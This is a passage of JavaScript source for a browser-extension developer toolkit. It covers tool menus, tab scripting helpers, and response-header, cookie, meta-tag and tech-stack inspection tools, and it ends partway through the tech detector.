// ── Categories & Tools ──────────────────────────────────────────────────────

const CATEGORIES = [
  { id: 'inspect', label: 'Inspect', tools: [
    { id: 'headers',  name: 'Response Headers',  icon: '📡' },
    { id: 'security', name: 'Security Headers',   icon: '🛡️' },
    { id: 'meta',     name: 'Meta & OG Tags',     icon: '🏷️' },
    { id: 'tech',     name: 'Tech Stack',          icon: '🔧' },
    { id: 'url',      name: 'URL Parser',           icon: '🔗' },
  ]},
  { id: 'visual', label: 'Visual', tools: [
    { id: 'color',    name: 'Color Picker',        icon: '🎨' },
    { id: 'fonts',    name: 'Font Detector',        icon: '🔤' },
    { id: 'outline',  name: 'CSS Outlines',         icon: '🔲' },
    { id: 'ruler',    name: 'Element Inspector',    icon: '📏' },
    { id: 'unblock',  name: 'Overlay Remover',      icon: '🚫' },
  ]},
  { id: 'tools', label: 'Tools', tools: [
    { id: 'testdata', name: 'Test Data',             icon: '🎲' },
    { id: 'forms',    name: 'Form Filler',           icon: '📝' },
    { id: 'sqli',     name: 'SQLi Tester',           icon: '💉' },
    { id: 'xss',      name: 'XSS Tester',            icon: '🧨' },
    { id: 'qr',       name: 'QR Code',                icon: '📷' },
  ]},
  { id: 'page', label: 'Page', tools: [
    { id: 'cookies',  name: 'Cookie Inspector',   icon: '🍪' },
    { id: 'storage',  name: 'Storage',               icon: '💾' },
    { id: 'network',  name: 'Resources',              icon: '📦' },
    { id: 'perf',     name: 'Performance',            icon: '⚡' },
    { id: 'a11y',     name: 'Accessibility',          icon: '♿' },
    { id: 'viewport', name: 'Viewport',               icon: '📱' },
  ]},
];

// ── State ───────────────────────────────────────────────────────────────────

let activeCategory = 'inspect';
let expandedTool = null;
const activeInjections = new Set(); // tracks 'outline', 'ruler'

// ── Helper functions ────────────────────────────────────────────────────────

let toastTimer = null;
function showCopyToast() {
  const toast = document.getElementById('copy-toast');
  if (!toast) return;
  toast.classList.add('show');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => toast.classList.remove('show'), 1200);
}

function copyToClipboard(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    btn.classList.add('copied');
    setTimeout(() => btn.classList.remove('copied'), 1200);
    showCopyToast();
  });
}

function flashCopied(el) {
  el.classList.add('copied');
  setTimeout(() => el.classList.remove('copied'), 1200);
  showCopyToast();
}

function updateKillButton() {
  const btn = document.getElementById('btn-kill');
  if (!btn) return;
  btn.classList.toggle('active', activeInjections.size > 0);
  btn.title = activeInjections.size > 0
    ? `Stop: ${[...activeInjections].join(', ')}`
    : 'No active tools';
}

function markInjection(name) {
  activeInjections.add(name);
  updateKillButton();
}

function clearInjection(name) {
  activeInjections.delete(name);
  updateKillButton();
}

function killAllInjections() {
  // Remove outlines
  executeOnActiveTab(() => {
    const s = document.getElementById('stingr-outline-style');
    if (s) s.remove();
    if (window.__stingrRuler) {
      document.removeEventListener('mousemove', window.__stingrRuler.onMove, true);
      document.removeEventListener('click', window.__stingrRuler.onClick, true);
      window.__stingrRuler.overlay.remove();
      window.__stingrRuler.label.remove();
      delete window.__stingrRuler;
    }
    if (window.__stingrPicker) {
      document.removeEventListener('mousemove', window.__stingrPicker.onMove, true);
      document.removeEventListener('click', window.__stingrPicker.onClick, true);
      document.removeEventListener('keydown', window.__stingrPicker.onKey, true);
      window.__stingrPicker.overlay.remove();
      window.__stingrPicker.label.remove();
      delete window.__stingrPicker;
    }
    if (window.__stingrBlocker) {
      window.__stingrBlocker.observer.disconnect();
      const badge = document.getElementById('stingr-blocker-badge');
      if (badge) badge.remove();
      delete window.__stingrBlocker;
    }
    return 'All cleared';
  }).then(() => {
    activeInjections.clear();
    updateKillButton();
    // Reset tool UIs if they are currently rendered
    resetToolUIs();
  }).catch(() => {});
}

function resetToolUIs() {
  // Reset outline buttons if visible
  const outlineBtns = ['outline-all', 'outline-semantic', 'outline-imgs'];
  outlineBtns.forEach(id => {
    const btn = document.getElementById(id);
    if (btn) {
      btn.classList.remove('btn-active');
      if (id === 'outline-all') btn.classList.add('btn-primary');
    }
  });
  const outlineStatus = document.getElementById('outline-status');
  if (outlineStatus) outlineStatus.textContent = '';

  // Reset ruler button if visible
  const rulerBtn = document.getElementById('ruler-on');
  if (rulerBtn) {
    rulerBtn.classList.remove('btn-active');
    rulerBtn.classList.add('btn-primary');
    rulerBtn.textContent = 'Enable Inspector';
  }

  // Reset picker button if visible
  const pickerBtn = document.getElementById('unblock-pick');
  if (pickerBtn) {
    pickerBtn.classList.remove('btn-active');
    pickerBtn.classList.add('btn-primary');
    pickerBtn.textContent = 'Pick & Remove';
  }

  // Reset blocker button if visible
  const blockerBtn = document.getElementById('unblock-block');
  if (blockerBtn) {
    blockerBtn.classList.remove('btn-active');
    blockerBtn.classList.add('btn-primary');
    blockerBtn.textContent = 'Block New Popups';
  }
}

function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = String(str);
  return div.innerHTML;
}

function getCurrentTab() {
  return new Promise(resolve => {
    if (typeof chrome !== 'undefined' && chrome.tabs) {
      chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
        resolve(tabs[0] || null);
      });
    } else {
      resolve(null);
    }
  });
}

function executeOnActiveTab(func, args = []) {
  return new Promise((resolve, reject) => {
    if (typeof chrome === 'undefined' || !chrome.scripting) {
      reject(new Error('Scripting API not available'));
      return;
    }
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      if (!tabs[0]) { reject(new Error('No active tab')); return; }
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: func,
        args: args
      }, results => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else {
          resolve(results[0]?.result);
        }
      });
    });
  });
}

function executeOnActiveTabMain(func, args = []) {
  return new Promise((resolve, reject) => {
    if (typeof chrome === 'undefined' || !chrome.scripting) {
      reject(new Error('Scripting API not available'));
      return;
    }
    chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
      if (!tabs[0]) { reject(new Error('No active tab')); return; }
      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        world: 'MAIN',
        func: func,
        args: args
      }, results => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else {
          resolve(results[0]?.result);
        }
      });
    });
  });
}

function showError(el, msg) {
  el.innerHTML = `<div class="tool-error">${escapeHtml(msg)}</div>`;
}

function showLoading(el) {
  el.innerHTML = '<div class="tool-loading">Loading...</div>';
}

function bindCopyAll(container) {
  container.querySelectorAll('[data-copy]').forEach(el => {
    el.addEventListener('click', function () {
      // If truncated and not yet expanded, expand instead of copying
      if (this.classList.contains('truncated') && !this.classList.contains('expanded')) {
        this.classList.add('expanded');
        this.classList.remove('truncated');
        return;
      }
      navigator.clipboard.writeText(this.dataset.copy).then(() => {
        flashCopied(this);
      });
    });
  });
  // Mark values that are truncated by -webkit-line-clamp
  requestAnimationFrame(() => {
    container.querySelectorAll('.info-value').forEach(el => {
      if (el.scrollHeight > el.clientHeight + 2) {
        el.classList.add('truncated');
      }
    });
  });
}

// ── Tab Bar (categories) ────────────────────────────────────────────────────

function renderTabs() {
  const bar = document.getElementById('tab-bar');
  bar.innerHTML = '';
  CATEGORIES.forEach(cat => {
    const btn = document.createElement('button');
    btn.className = 'tab' + (activeCategory === cat.id ? ' active' : '');
    btn.textContent = cat.label;
    btn.addEventListener('click', () => switchCategory(cat.id));
    bar.appendChild(btn);
  });
}

function switchCategory(id) {
  activeCategory = id;
  expandedTool = null;
  renderTabs();
  renderCategory(id);
}

// ── Category Renderer (accordion sections) ──────────────────────────────────

const TOOL_RENDERERS = {
  headers: renderHeadersTool,
  cookies: renderCookiesTool,
  meta: renderMetaTool,
  tech: renderTechTool,
  url: renderUrlParseTool,
  color: renderColorTool,
  forms: renderFormsTool,
  fonts: renderFontsTool,
  a11y: renderA11yTool,
  outline: renderOutlineTool,
  ruler: renderRulerTool,
  storage: renderStorageTool,
  network: renderNetworkTool,
  testdata: renderTestDataTool,
  viewport: renderViewportTool,
  perf: renderPerfTool,
  sqli: renderSqliTool,
  xss: renderXssTool,
  security: renderSecurityHeadersTool,
  qr: renderQrTool,
  unblock: renderUnblockTool,
};

function renderCategory(catId) {
  const container = document.getElementById('tool-content');
  container.innerHTML = '';

  const cat = CATEGORIES.find(c => c.id === catId);
  if (!cat) return;

  cat.tools.forEach((tool, i) => {
    const section = document.createElement('div');
    section.className = 'tool-section';

    const header = document.createElement('div');
    header.className = 'tool-section-header';
    header.innerHTML = `
      <span class="tool-section-icon">${tool.icon}</span>
      <span class="tool-section-name">${escapeHtml(tool.name)}</span>
      <span class="tool-section-arrow">▾</span>
    `;

    const body = document.createElement('div');
    body.className = 'tool-section-body';
    body.style.display = 'none';

    header.addEventListener('click', () => {
      const isExpanded = body.style.display !== 'none';

      // Collapse all sections
      container.querySelectorAll('.tool-section').forEach(s => s.classList.remove('expanded'));
      container.querySelectorAll('.tool-section-body').forEach(b => {
        b.style.display = 'none';
        b.innerHTML = '';
      });
      container.querySelectorAll('.tool-section-header').forEach(h => {
        h.classList.remove('expanded');
        // arrow rotation handled by CSS via .expanded class
      });

      if (!isExpanded) {
        section.classList.add('expanded');
        body.style.display = 'flex';
        header.classList.add('expanded');
        // arrow rotation handled by CSS via .expanded class
        expandedTool = tool.id;
        const renderer = TOOL_RENDERERS[tool.id];
        if (renderer) renderer(body);
      } else {
        expandedTool = null;
      }
    });

    section.appendChild(header);
    section.appendChild(body);
    container.appendChild(section);

    // Expand first tool by default
    if (i === 0) {
      header.click();
    }
  });
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Response Headers
// ═══════════════════════════════════════════════════════════════════════════

function renderHeadersTool(el) {
  el.innerHTML = `
    <div style="text-align: right; margin-bottom: 4px"><button class="btn-refresh" id="headers-refresh">Refresh</button></div>
    <div id="server-info"></div>
    <div id="headers-output"></div>
  `;

  function loadHeaders() {
    const output = el.querySelector('#headers-output');
    const serverInfo = el.querySelector('#server-info');
    showLoading(output);
    serverInfo.innerHTML = '';

    (async () => {
      try {
        const tab = await getCurrentTab();
        if (!tab || !tab.url) { showError(output, 'No active tab'); return; }
        if (tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
          showError(output, 'Cannot read headers from browser internal pages');
          return;
        }

        const hostname = new URL(tab.url).hostname;

        // Fetch headers + server geo info in parallel
        const [resp, geo] = await Promise.all([
          fetch(tab.url, { method: 'HEAD', credentials: 'omit' }),
          fetch('http://ip-api.com/json/' + hostname + '?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,hosting,query')
            .then(r => r.json()).catch(() => null)
        ]);

        // Server info card
        if (geo && geo.status === 'success') {
          const flag = getFlagEmoji(geo.countryCode);
          let infoHtml = '<div class="server-card">';
          infoHtml += `<div class="server-card-title">Server Info</div>`;
          infoHtml += '<div class="info-table">';
          infoHtml += `<div class="info-row"><span class="info-label">IP</span><span class="info-value" data-copy="${escapeHtml(geo.query)}">${escapeHtml(geo.query)}</span></div>`;
          infoHtml += `<div class="info-row"><span class="info-label">Location</span><span class="info-value" data-copy="${escapeHtml(geo.city + ', ' + geo.regionName + ', ' + geo.country)}">${flag} ${escapeHtml(geo.city)}${geo.regionName ? ', ' + escapeHtml(geo.regionName) : ''}, ${escapeHtml(geo.country)}</span></div>`;
          if (geo.isp) infoHtml += `<div class="info-row"><span class="info-label">ISP</span><span class="info-value" data-copy="${escapeHtml(geo.isp)}">${escapeHtml(geo.isp)}</span></div>`;
          if (geo.org && geo.org !== geo.isp) infoHtml += `<div class="info-row"><span class="info-label">Org</span><span class="info-value" data-copy="${escapeHtml(geo.org)}">${escapeHtml(geo.org)}</span></div>`;
          if (geo.as) infoHtml += `<div class="info-row"><span class="info-label">AS</span><span class="info-value" data-copy="${escapeHtml(geo.as)}">${escapeHtml(geo.as)}</span></div>`;
          if (geo.hosting) infoHtml += `<div class="info-row"><span class="info-label">Type</span><span class="info-value" style="color: var(--accent)">Hosted / Data Center</span></div>`;
          infoHtml += '</div></div>';
          serverInfo.innerHTML = infoHtml;
          bindCopyAll(serverInfo);
        }

        // Headers
        const headers = [];
        resp.headers.forEach((value, name) => {
          headers.push({ name, value });
        });

        if (headers.length === 0) {
          output.innerHTML = '<div class="tool-empty">No headers returned</div>';
          return;
        }

        let html = `<div class="hint" style="margin-bottom:6px">Status: <b>${resp.status}</b> ${escapeHtml(resp.statusText)} · Click any value to copy</div>`;
        html += '<div class="info-table">';
        headers.forEach(h => {
          html += `<div class="info-row">
            <span class="info-label" data-copy="${escapeHtml(h.name)}">${escapeHtml(h.name)}</span>
            <span class="info-value" data-copy="${escapeHtml(h.value)}">${escapeHtml(h.value)}</span>
          </div>`;
        });
        html += '</div>';
        output.innerHTML = html;
        bindCopyAll(output);
      } catch (e) {
        showError(output, 'Failed to fetch headers: ' + e.message);
      }
    })();
  }

  el.querySelector('#headers-refresh').addEventListener('click', loadHeaders);
  loadHeaders();
}

function getFlagEmoji(countryCode) {
  if (!countryCode || countryCode.length !== 2) return '';
  const offset = 127397;
  return String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => c.charCodeAt(0) + offset));
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Cookies
// ═══════════════════════════════════════════════════════════════════════════

function renderCookiesTool(el) {
  el.innerHTML = `
    <div class="btn-row">
      <button class="btn" id="cookie-add" title="Add new cookie">+ Add Cookie</button>
    </div>
    <div id="cookies-output"></div>
  `;
  const output = el.querySelector('#cookies-output');
  showLoading(output);

  function getCookieUrl(tab, cookie) {
    const urlObj = new URL(tab.url);
    return urlObj.protocol + '//' + (cookie.domain.startsWith('.') ? cookie.domain.slice(1) : cookie.domain) + cookie.path;
  }

  (async () => {
    try {
      const tab = await getCurrentTab();
      if (!tab || !tab.url) { showError(output, 'No active tab'); return; }
      if (!chrome.cookies) { showError(output, 'Cookies API not available'); return; }

      // Add cookie button
      el.querySelector('#cookie-add').addEventListener('click', () => {
        const existing = output.querySelector('.cookie-add-form');
        if (existing) { existing.remove(); return; }
        const urlObj = new URL(tab.url);
        const form = document.createElement('div');
        form.className = 'cookie-add-form';
        form.innerHTML = `
          <input type="text" class="input-field" id="ck-new-name" placeholder="Cookie name" style="margin-bottom:4px">
          <input type="text" class="input-field" id="ck-new-value" placeholder="Cookie value" style="margin-bottom:4px">
          <div style="display:flex;gap:4px;margin-bottom:4px">
            <input type="text" class="input-field" id="ck-new-domain" placeholder="Domain" value="${escapeHtml(urlObj.hostname)}" style="flex:1">
            <input type="text" class="input-field" id="ck-new-path" placeholder="Path" value="/" style="width:60px">
          </div>
          <div class="btn-row">
            <button class="btn btn-primary" id="ck-save-new">Save</button>
            <button class="btn" id="ck-cancel-new">Cancel</button>
          </div>
        `;
        output.insertBefore(form, output.firstChild);
        form.querySelector('#ck-cancel-new').addEventListener('click', () => form.remove());
        form.querySelector('#ck-save-new').addEventListener('click', () => {
          const name = form.querySelector('#ck-new-name').value.trim();
          const value = form.querySelector('#ck-new-value').value;
          const domain = form.querySelector('#ck-new-domain').value.trim();
          const path = form.querySelector('#ck-new-path').value.trim() || '/';
          if (!name) return;
          const cookieUrl = urlObj.protocol + '//' + domain + path;
          chrome.cookies.set({ url: cookieUrl, name, value, path }, () => {
            renderCookiesTool(el);
          });
        });
      });

      chrome.cookies.getAll({ url: tab.url }, cookies => {
        if (!cookies || cookies.length === 0) {
          output.innerHTML = '<div class="tool-empty">No cookies found</div>';
          return;
        }

        let html = '';
        cookies.forEach((c, i) => {
          const expires = c.expirationDate
            ? new Date(c.expirationDate * 1000).toLocaleString()
            : 'Session';
          const flags = [];
          if (c.secure) flags.push('Secure');
          if (c.httpOnly) flags.push('HttpOnly');
          if (c.sameSite && c.sameSite !== 'unspecified') flags.push('SameSite=' + c.sameSite);

          html += `<div class="cookie-card">
            <div class="cookie-header">
              <span class="cookie-name" data-copy="${escapeHtml(c.name)}">${escapeHtml(c.name)}</span>
              ${!c.httpOnly ? `<button class="btn-tiny btn-edit" data-idx="${i}" title="Edit value">✎</button>` : ''}
              <button class="btn-tiny btn-delete" data-idx="${i}" title="Delete cookie">✕</button>
            </div>
            <div class="cookie-value" data-copy="${escapeHtml(c.value)}">${escapeHtml(c.value || '(empty)')}</div>
            <div class="cookie-meta">
              <span>${escapeHtml(c.domain)}${escapeHtml(c.path)}</span>
              <span>${expires}</span>
            </div>
            ${flags.length ? '<div class="cookie-flags">' + flags.map(f => '<span class="badge">' + f + '</span>').join('') + '</div>' : ''}
          </div>`;
        });

        html += `<div class="hint" style="margin-top:6px">${cookies.length} cookie${cookies.length > 1 ? 's' : ''} · Click name or value to copy</div>`;
        output.innerHTML = html;
        bindCopyAll(output);

        // Edit buttons
        output.querySelectorAll('.btn-edit').forEach(btn => {
          btn.addEventListener('click', () => {
            const idx = parseInt(btn.dataset.idx);
            const cookie = cookies[idx];
            const card = btn.closest('.cookie-card');
            const valueEl = card.querySelector('.cookie-value');
            const editor = document.createElement('div');
            editor.className = 'cookie-edit-form';
            editor.innerHTML = `
              <input type="text" class="input-field" id="ck-edit-val" value="${escapeHtml(cookie.value)}" style="margin-top:4px">
              <div class="btn-row" style="margin-top:4px">
                <button class="btn btn-primary btn-sm" id="ck-edit-save">Save</button>
                <button class="btn btn-sm" id="ck-edit-cancel">Cancel</button>
              </div>
            `;
            valueEl.replaceWith(editor);
            editor.querySelector('#ck-edit-cancel').addEventListener('click', () => renderCookiesTool(el));
            editor.querySelector('#ck-edit-save').addEventListener('click', () => {
              const newVal = editor.querySelector('#ck-edit-val').value;
              const cookieUrl = getCookieUrl(tab, cookie);
              const details = { url: cookieUrl, name: cookie.name, value: newVal, path: cookie.path };
              if (cookie.secure) details.secure = true;
              if (cookie.sameSite && cookie.sameSite !== 'unspecified') details.sameSite = cookie.sameSite;
              if (cookie.expirationDate) details.expirationDate = cookie.expirationDate;
              chrome.cookies.set(details, () => {
                renderCookiesTool(el);
              });
            });
          });
        });

        // Delete buttons
        output.querySelectorAll('.btn-delete').forEach(btn => {
          btn.addEventListener('click', () => {
            const idx = parseInt(btn.dataset.idx);
            const cookie = cookies[idx];
            const cookieUrl = getCookieUrl(tab, cookie);
            chrome.cookies.remove({ url: cookieUrl, name: cookie.name }, () => {
              renderCookiesTool(el);
            });
          });
        });
      });
    } catch (e) {
      showError(output, 'Failed to read cookies: ' + e.message);
    }
  })();
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Meta Tags
// ═══════════════════════════════════════════════════════════════════════════

function renderMetaTool(el) {
  el.innerHTML = `<div id="meta-output"></div>`;
  const output = el.querySelector('#meta-output');
  showLoading(output);

  executeOnActiveTab(() => {
    const result = { title: document.title, meta: [], og: [], twitter: [], other: [] };

    document.querySelectorAll('meta').forEach(m => {
      const name = m.getAttribute('name') || m.getAttribute('property') || m.getAttribute('http-equiv') || '';
      const content = m.getAttribute('content') || '';
      if (!name && !content) return;

      if (name.startsWith('og:')) {
        result.og.push({ name, content });
      } else if (name.startsWith('twitter:')) {
        result.twitter.push({ name, content });
      } else if (['description', 'keywords', 'author', 'robots', 'viewport', 'theme-color', 'generator'].includes(name.toLowerCase())) {
        result.meta.push({ name, content });
      } else {
        result.other.push({ name, content });
      }
    });

    // Canonical
    const canonical = document.querySelector('link[rel="canonical"]');
    if (canonical) result.meta.push({ name: 'canonical', content: canonical.href });

    // Favicon
    const icon = document.querySelector('link[rel="icon"], link[rel="shortcut icon"]');
    if (icon) result.meta.push({ name: 'favicon', content: icon.href });

    return result;
  }).then(data => {
    if (!data) { showError(output, 'Could not read meta tags'); return; }

    let html = '';

    // Title
    html += `<div class="info-section">
      <div class="info-section-title">Page Title</div>
      <div class="info-value" data-copy="${escapeHtml(data.title)}">${escapeHtml(data.title || '(none)')}</div>
    </div>`;

    // Standard meta
    if (data.meta.length) {
      html += '<div class="info-section"><div class="info-section-title">Standard</div><div class="info-table">';
      data.meta.forEach(m => {
        html += `<div class="info-row">
          <span class="info-label">${escapeHtml(m.name)}</span>
          <span class="info-value" data-copy="${escapeHtml(m.content)}">${escapeHtml(m.content)}</span>
        </div>`;
      });
      html += '</div></div>';
    }

    // OG
    if (data.og.length) {
      html += '<div class="info-section"><div class="info-section-title">Open Graph</div><div class="info-table">';
      data.og.forEach(m => {
        html += `<div class="info-row">
          <span class="info-label">${escapeHtml(m.name.replace('og:', ''))}</span>
          <span class="info-value" data-copy="${escapeHtml(m.content)}">${escapeHtml(m.content)}</span>
        </div>`;
      });
      html += '</div></div>';
    }

    // Twitter
    if (data.twitter.length) {
      html += '<div class="info-section"><div class="info-section-title">Twitter Card</div><div class="info-table">';
      data.twitter.forEach(m => {
        html += `<div class="info-row">
          <span class="info-label">${escapeHtml(m.name.replace('twitter:', ''))}</span>
          <span class="info-value" data-copy="${escapeHtml(m.content)}">${escapeHtml(m.content)}</span>
        </div>`;
      });
      html += '</div></div>';
    }

    // Other
    if (data.other.length) {
      html += '<div class="info-section"><div class="info-section-title">Other</div><div class="info-table">';
      data.other.forEach(m => {
        html += `<div class="info-row">
          <span class="info-label">${escapeHtml(m.name)}</span>
          <span class="info-value" data-copy="${escapeHtml(m.content)}">${escapeHtml(m.content)}</span>
        </div>`;
      });
      html += '</div></div>';
    }

    if (!html) html = '<div class="tool-empty">No meta tags found</div>';
    else html += '<div class="hint" style="margin-top:6px">Click any value to copy</div>';

    output.innerHTML = html;
    bindCopyAll(output);
  }).catch(e => showError(output, e.message));
}

// ═══════════════════════════════════════════════════════════════════════════
// TOOL: Tech Detector
// ═══════════════════════════════════════════════════════════════════════════

function renderTechTool(el) {
  el.innerHTML = `<div class="tool-header"><span class="tool-desc-text">Scanning page...</span><button class="btn-refresh" id="tech-refresh">Rescan</button></div><div id="tech-output"></div>`;
  const output = el.querySelector('#tech-output');

  function scan() {
    showLoading(output);

    // 1) DOM-based detection (runs in ISOLATED world — fine for DOM queries)
    const domPromise = executeOnActiveTab(() => {
      const d = [];
      const q = (sel) => !!document.querySelector(sel);
      const scripts = Array.from(document.querySelectorAll('script[src]')).map(s => s.src);
      const links = Array.from(document.querySelectorAll('link[href]')).map(l => l.href);
      const metas = {};
      document.querySelectorAll('meta[name], meta[property]').forEach(m => {
        metas[(m.name || m.getAttribute('property')).toLowerCase()] = m.content;
      });
      const gen = (metas.generator || '').toLowerCase();

      // ── Frameworks (DOM) ───────────────────────────────
      if (q('[data-reactroot], [data-react-helmet], [data-reactid]')) d.push({ name: 'React', cat: 'Framework' });
      if (q('#__next') || scripts.some(s => s.includes('/_next/'))) d.push({ name: 'Next.js', cat: 'Framework' });
      const hasVueAttrs = !!document.querySelector('[data-v-]') || !!document.querySelector('*').outerHTML.match(/\sdata-v-[a-f0-9]/);
      if (hasVueAttrs) d.push({ name: 'Vue.js', cat: 'Framework' });
      if (q('#__nuxt') || scripts.some(s => s.includes('/_nuxt/'))) d.push({ name: 'Nuxt', cat: 'Framework' });
      if (q('[ng-version]')) {
        const v = document.querySelector('[ng-version]').getAttribute('ng-version');
        d.push({ name: 'Angular' + (v ? ' ' + v : ''), cat: 'Framework' });
      }
      if (q('[ng-app], [ng-controller], [ng-model]')) d.push({ name: 'AngularJS', cat: 'Framework' });
      if (q('[class*="svelte-"]') || q('[data-svelte-h]') || q('#svelte-announcer')) d.push({ name: 'Svelte', cat: 'Framework' });
      if (q('#___gatsby') || gen.includes('gatsby')) {
        const ver = gen.match(/gatsby\s*([\d.]+)/i);
        d.push({ name: 'Gatsby' + (ver ? ' ' + ver[1] : ''), cat: 'Framework' });
      }
      if (q('.ember-view, .ember-application')) d.push({ name: 'Ember.js', cat: 'Framework' });
      if (q('[data-turbo], [data-turbolinks]')) d.push({ name: 'Hotwire/Turbo', cat: 'Framework' });
      if (scripts.some(s => s.includes('astro'))) d.push({ name: 'Astro', cat: 'Framework' });

      // ── CSS Frameworks (DOM) ───────────────────────────
      // Tailwind: check for CSS custom properties
      const twProps = ['--tw-ring-offset-shadow', '--tw-ring-shadow', '--tw-translate-x', '--tw-border-opacity', '--tw-text-opacity'];
      const rootStyle = getComputedStyle(document.documentElement);
      const hasTwVars = twProps.some(p => rootStyle.getPropertyValue(p) !== '');
      // Also check for tailwind-style utility class patterns in a sample of elements
      const sampleHTML = document.body.innerHTML.slice(0, 50000);
      const twClassCount = (sampleHTML.match(/\bclass="[^"]*\b(flex|items-center|justify-between|px-\d|py-\d|bg-\w+-\d{2,3}|text-\w+-\d{2,3}|rounded-\w|space-[xy]-\d|gap-\d|w-\d|h-\d)\b/g) || []).length;
      if (hasTwVars || twClassCount >= 5 || q('link[href*="tailwind"]') || links.some(l => l.includes('tailwind'))) {
        d.push({ name: 'Tailwind CSS', cat: 'CSS' });
      }
      if (q('link[href*="bootstrap"]') || links.some(l => l.includes('bootstrap')) || scripts.some(s => s.includes('bootstrap'))) {
        d.push({ name: 'Bootstrap', cat: 'CSS' });
      }
      if (q('[class*="MuiBox"], [class*="MuiButton"], [class*="MuiPaper"]')) d.push({ name: 'Material UI', cat: 'CSS' });
      if (q('[class*="chakra-"]')) d.push({ name: 'Chakra UI', cat: 'CSS' });
      if (q('[class*="ant-btn"], [class*="ant-layout"], [class*="ant-col"]')) d.push({ name: 'Ant Design', cat: 'CSS' });
      if (q('.hero.is-primary, .columns .column, .is-flex') || links.some(l => l.includes('bulma'))) d.push({ name: 'Bulma', cat: 'CSS' });
      if (links.some(l => l.includes('font-awesome') || l.includes('fontawesome'))) d.push({ name: 'Font Awesome', cat: 'CSS' });

      // ── CMS / Platforms (DOM) ──────────────────────────
      if (gen.includes('wordpress') || q('link[href*="wp-content"], link[href*="wp-includes"]') || scripts.some(s => s.includes('wp-content') || s.includes('wp-includes'))) {
        const ver = gen.match(/wordpress\s*([\d.]+)/i);
        d.push({ name: 'WordPress' + (ver ? ' ' + ver[1] : ''), cat: 'Platform' });
      }
      if (q('meta[name="shopify-checkout-api-token"]') || links.some(l => l.includes('cdn.shopify')) || scripts.some(s => s.includes('cdn.shopify'))) d.push({ name: 'Shopify', cat: 'Platform' });
      if (gen.includes('wix') || q('meta[name="generator"][content*="Wix"]') || scripts.some(s => s.includes('parastorage.com'))) d.push({ name: 'Wix', cat: 'Platform' });
      if (q('html[data-wf-site]') || gen.includes('webflow')) d.push({ name: 'Webflow', cat: 'Platform' });
      if (gen.includes('squarespace') || scripts.some(s => s.includes('squarespace.com'))) d.push({ name: 'Squarespace', cat: 'Platform' });
      if (gen.includes('ghost')) d.push({ name: 'Ghost', cat: 'Platform' });
      if (gen.includes('drupal')) d.push({ name: 'Drupal', cat: 'Platform' });
      if (gen.includes('joomla')) d.push({ name: 'Joomla', cat: 'Platform' });
      if (q('meta[name="ajs-remote-data"]') || q('#confluence-context-path')) d.push({ name: 'Confluence', cat: 'Platform' });

      // ── Analytics (DOM) ────────────────────────────────
      if (scripts.some(s => s.includes('google-analytics.com') || s.includes('googletagmanager.com/gtag'))) d.push({ name: 'Google Analytics', cat: 'Analytics' });
      if (scripts.some(s => s.includes('googletagmanager.com/gtm'))) d.push({ name: 'Google Tag Manager', cat: 'Analytics' });
      if (scripts.some(s => s.includes('connect.facebook.net')) || q('img[src*="facebook.com/tr"]')) d.push({ name: 'Meta Pixel', cat: 'Analytics' });
      if (scripts.some(s => s.includes('hotjar.com'))) d.push({ name: 'Hotjar', cat: 'Analytics' });
      if (scripts.some(s => s.includes('segment.com') || s.includes('segment.io'))) d.push({ name: 'Segment', cat: 'Analytics' });
      if (scripts.some(s => s.includes('cdn.mxpnl.com') || s.includes('mixpanel'))) d.push({ name: 'Mixpanel', cat: 'Analytics' });
      if (scripts.some(s => s.includes('amplitude.com'))) d.push({ name: 'Amplitude', cat: 'Analytics' });
      if (scripts.some(s => s.includes('clarity.ms'))) d.push({ name: 'Microsoft Clarity', cat: 'Analytics' });
      if (scripts.some(s => s.includes('plausible.io'))) d.push({ name: 'Plausible', cat: 'Analytics' });
      if (scripts.some(s => s.includes('sentry.io') || s.includes('sentry-cdn'))) d.push({ name: 'Sentry', cat: 'Analytics' });
      if (q('#intercom-container, .intercom-lightweight-app') || scripts.some(s => s.includes('intercom'))) d.push({ name: 'Intercom', cat: 'Tools' });
      if (scripts.some(s => s.includes('crisp.chat'))) d.push({ name: 'Crisp', cat: 'Tools' });
      if (scripts.some(s => s.includes('zendesk.com'))) d.push({ name: 'Zendesk', cat: 'Tools' });

      // ── CDN / Hosting (DOM) ────────────────────────────
      if (scripts.some(s => s.includes('cloudflare'))) d.push({ name: 'Cloudflare', cat: 'CDN' });
      if (scripts.some(s => s.includes('.vercel.app') || s.includes('vercel-scripts'))) d.push({ name: 'Vercel', cat: 'CDN' });
      if (scripts.some(s => s.includes('netlify'))) d.push({ name: 'Netlify', cat: 'CDN' });
      if (scripts.some(s => s.includes('cloudfront.net'))) d.push({ name: 'CloudFront', cat: 'CDN' });
      if (scripts.some(s => s.includes('googleapis.com') || s.includes('gstatic.com'))) d.push({ name: 'Google CDN', cat: 'CDN' });
      if (scripts.some(s => s.includes('unpkg.com'))) d.push({ name: 'unpkg', cat: 'CDN' });
      if (scripts.some(s => s.includes('cdnjs.cloudflare.com'))) d.push({ name: 'cdnjs', cat: 'CDN' });
      if (scripts.some(s => s.includes('jsdelivr.net'))) d.push({ name: 'jsDelivr', cat: 'CDN' });

      // ── Build / Other (DOM) ────────────────────────────
      if (q('script[type="module"]')) d.push({ name: 'ES Modules', cat: 'Build' });
      if (q('script[id="vite-legacy-polyfill"], script[id="vite-legacy-entry"]') || scripts.some(s => s.includes('@vite'))) d.push({ name: 'Vite', cat: 'Build' });
      if (navigator.serviceWorker && navigator.serviceWorker.controller) d.push({ name: 'Service Worker', cat: 'Build' });

      // ── Meta info ──────────────────────────────────────
      const poweredBy = document.querySelector('meta[http-equiv="X-Powered-By"]');
